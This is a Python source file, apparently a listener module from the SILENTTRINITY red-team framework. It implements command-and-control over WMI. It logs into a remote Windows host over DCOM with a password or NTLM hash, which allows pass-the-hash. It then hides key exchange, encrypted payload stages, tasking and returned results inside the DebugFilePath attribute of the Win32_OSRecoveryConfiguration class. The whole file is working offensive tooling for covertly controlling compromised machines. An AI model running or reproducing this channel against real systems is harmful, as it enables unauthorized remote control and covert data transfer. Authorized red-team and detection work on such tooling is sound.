import logging
import sys
from silenttrinity.core.events import Events
from silenttrinity.core.teamserver.listener import Listener
from uuid import UUID
from time import sleep
from base64 import b64decode, b64encode
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL


class STListener(Listener):
    def __init__(self):
        super().__init__()
        self.name = 'wmi'
        self.author = '@byt3bl33d3r'
        self.description = 'C2 over pure WMI'

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'wmi'
            },
            'Host': {
                'Description'   :   'Remote host to poll',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Domain': {
                'Description'   :   'Domain',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username': {
                'Description'   :   'Username',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password': {
                'Description'   :   'Password',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hash': {
                'Description'   :   'NTLM Hash',
                'Required'      :   False,
                'Value'         :   ''
            },
            'CheckInterval': {
                'Description'   :   'Interval in seconds to check for agent output',
                'Required'      :   True,
                'Value'         :   10
            },
            'WMIClass': {
                'Description'   :   'WMI class to use for C2',
                'Required'      :   True,
                'Value'         :   "Win32_OSRecoveryConfiguration"
            },
            'WMIAttribute': {
                'Description'   :   'WMI class attribute to use for C2',
                'Required'      :   True,
                'Value'         :   "DebugFilePath"
            },
            'Comms': {
                'Description'   :   'C2 Comms to use',
                'Required'      :   True,
                'Value'         :   'wmi'
            }
        }

    def read(self, iWbemServices, query="Select * From Win32_OSRecoveryConfiguration"):
        records = []

        iEnumWbemClassObject = iWbemServices.ExecQuery(query)
        while True:
            try:
                pEnum = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                records.append(pEnum.getProperties())
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        iEnumWbemClassObject.RemRelease()

        return records

    def write(self, iWbemServices, records, payload="%SystemRoot%\\MEMORY.DMP", attribute='DebugFilePath', wmi_class='Win32_OSRecoveryConfiguration'):

        def autoconvert(v):
            type_dict = {
                'string': str,
                'uint32': int,
                'bool': bool
            }

            return type_dict[v['stype']](v['value'])

        activeScript, _ = iWbemServices.GetObject(wmi_class)
        activeScript = activeScript.SpawnInstance()
        for record in records:
            for k, v in record.items():
                setattr(activeScript, k, autoconvert(v))

        if payload:
            setattr(activeScript, attribute, payload)

        logging.debug("activeScript.DebugFilePath: {}...".format(activeScript.DebugFilePath[:100]))

        resp = iWbemServices.PutInstance(activeScript.marshalMe())

        if resp.GetCallStatus(0) != 0:
            raise Exception('Writing payload to {}.{} - ERROR (0x{})'.format(wmi_class, attribute, resp.GetCallStatus(0)))

        logging.debug('Writing payload to {}.{} - OK'.format(wmi_class, attribute))

    def run(self):
        logging.debug("Creating DCOM connection")

        lmhash = ''
        nthash = ''

        if self["Hash"]:
            if self["Hash"].find(":") > -1:
                lmhash, nthash = self["Hash"].split(":")
            else:
                nthash = self["Hash"]

        dcom = DCOMConnection(
            self["Host"],
            self["Username"],
            self["Password"],
            self["Domain"],
            lmhash,
            nthash,
            #self.aesKey,
            oxidResolver=False,
            #doKerberos=self.doKerberos
        )

        logging.debug("Creating new iWbemServices instance")
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        while True:
            try:
                records = self.read(iWbemServices)
                #self.write(iWbemServices, records)

                DebugFilePathValue = list(filter(lambda r: r[0] == "DebugFilePath", records[0].items()))[0][1]["value"]

                if DebugFilePathValue != "%SystemRoot%\\MEMORY.DMP":
                    GUID, op, creator, data = DebugFilePathValue.split(":")

                    if creator == "client":

                        if op == "kex":
                            pub_key = self.dispatch_event(Events.KEX, (GUID, self["Host"], b64decode(data)))
                            self.write(iWbemServices, records, payload=f"{GUID}:kex:server:{b64encode(pub_key.encode()).decode()}")

                        elif op == "stage":
                            stage_file = self.dispatch_event(Events.ENCRYPT_STAGE, (self["Comms"], GUID, self["Host"]))
                            if stage_file:
                                self.dispatch_event(Events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {self["Host"]} ...')
                                self.write(iWbemServices, records, payload=f"{GUID}:stage:server:{b64encode(stage_file)}")

                        elif op == "jobs":
                            job = self.dispatch_event(Events.SESSION_CHECKIN, (GUID, self["Host"]))
                            if job:
                                self.write(iWbemServices, records, payload=f"{GUID}:jobs:server:{b64encode(job).decode()}")

                        elif op.startswith("job_results"):
                            _,job_id = op.split("|")
                            print(data)
                            self.dispatch_event(Events.JOB_RESULT, (GUID, job_id, b64decode(data)))
                            self.write(iWbemServices, records)

            except Exception as e:
                print("Error")
                print(e)

            sleep(int(self["CheckInterval"]))
